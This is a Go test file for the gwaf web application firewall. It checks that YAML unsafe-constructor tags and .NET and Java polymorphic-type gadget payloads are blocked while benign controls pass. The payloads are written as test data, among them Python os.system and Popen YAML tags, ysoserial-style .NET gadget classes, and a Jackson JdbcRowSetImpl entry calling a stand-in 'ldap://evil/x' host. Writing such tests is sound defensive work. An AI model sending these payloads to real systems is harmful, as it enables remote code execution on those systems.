// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.
// SPDX-License-Identifier: MIT

package core_test

import (
	"bytes"
	"context"
	"net/http/httptest"
	"testing"

	"github.com/gsoultan/gwaf"
)

// These two classes were confirmed bypassing a shipped gateway (gwaf v0.6.3)
// during the 2026-10-25 CVE/adversarial test: a YAML object-constructor tag and
// a dotted .NET/Java polymorphic type marker both reached the origin. Each case
// below is an attack that must block or a benign control that must pass, and the
// controls are what keep the fix from being "block everything that mentions a
// class".
func newProbeWAF(t *testing.T) *gwaf.WAF {
	t.Helper()
	w, err := gwaf.New()
	if err != nil {
		t.Fatalf("gwaf.New: %v", err)
	}
	return w
}

func probeBlocks(t *testing.T, w *gwaf.WAF, body []byte, ct string) bool {
	t.Helper()
	r := httptest.NewRequest("POST", "/x", bytes.NewReader(body))
	r.Header.Set("Content-Type", ct)
	tx := w.NewTransaction()
	defer tx.Close()
	tx.SetRequestLine("POST", "/x", "HTTP/1.1")
	tx.SetRemoteAddr("192.0.2.1")
	tx.AddRequestHeader("Content-Type", ct)
	tx.SetRequestBody(body)
	return tx.ProcessRequestHeaders().Blocked() || tx.ProcessRequestBody().Blocked()
}

func TestYAMLUnsafeConstructorBlocked(t *testing.T) {
	w := newProbeWAF(t)
	cases := []struct {
		name   string
		body   string
		ct     string
		attack bool
	}{
		{"python apply", `!!python/object/apply:os.system ["id"]`, "application/x-yaml", true},
		{"python new popen", `!!python/object/new:subprocess.Popen [["id"]]`, "text/yaml", true},
		{"python object bare", "x: !!python/object:os.System {}", "application/yaml", true},
		{"ruby object", "--- !ruby/object:Gem::Installer {}\n!!ruby/object:Foo {}", "application/x-yaml", true},
		{"benign yaml", "name: alice\nrole: admin\ntags:\n  - a\n  - b\n", "application/x-yaml", false},
		{"benign yaml typed scalars", "count: !!int 3\nwhen: !!timestamp 2026-10-25\nlabel: !!str hi\n", "application/x-yaml", false},
	}
	for _, c := range cases {
		got := probeBlocks(t, w, []byte(c.body), c.ct)
		if got != c.attack {
			t.Errorf("%s: blocked=%v, want %v", c.name, got, c.attack)
		}
	}
}

func TestDotNetGadgetClassBlocked(t *testing.T) {
	w := newProbeWAF(t)
	cases := []struct {
		name   string
		body   string
		attack bool
	}{
		// .NET Json.NET TypeNameHandling naming a ysoserial.net gadget class.
		// The confirmed 2026-10-25 bypass: it reached the origin on v0.6.3.
		{"objectdataprovider $type", `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start"}`, true},
		{"expandedwrapper wrap", `{"$type":"System.Data.Services.Internal.ExpandedWrapper` + "`" + `2[[x],[y]], System.Data.Services"}`, true},
		{"xamlreader", `{"__type":"System.Windows.Markup.XamlReader"}`, true},
		// Java gadget via @type (already on the list, kept as a cross-check).
		{"jackson jdbcrowset", `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/x"}`, true},
		// Benign controls: a legitimate TypeNameHandling payload for the app's
		// own type must pass -- this is why the gadget *class* is the signal,
		// not the "$type" key. Plus JSON-LD and an ordinary field.
		{"app typenamehandling", `{"$type":"MyApp.Order, MyApp","total":42}`, false},
		{"jsonld person", `{"@type":"Person","name":"Alice"}`, false},
		{"generic list typing", `{"$type":"System.Collections.Generic.List, mscorlib","values":[1,2]}`, false},
		{"ordinary type word", `{"type":"user","role":"admin"}`, false},
	}
	for _, c := range cases {
		got := probeBlocks(t, w, []byte(c.body), "application/json")
		if got != c.attack {
			t.Errorf("%s: blocked=%v, want %v", c.name, got, c.attack)
		}
	}
	_ = context.Background
}
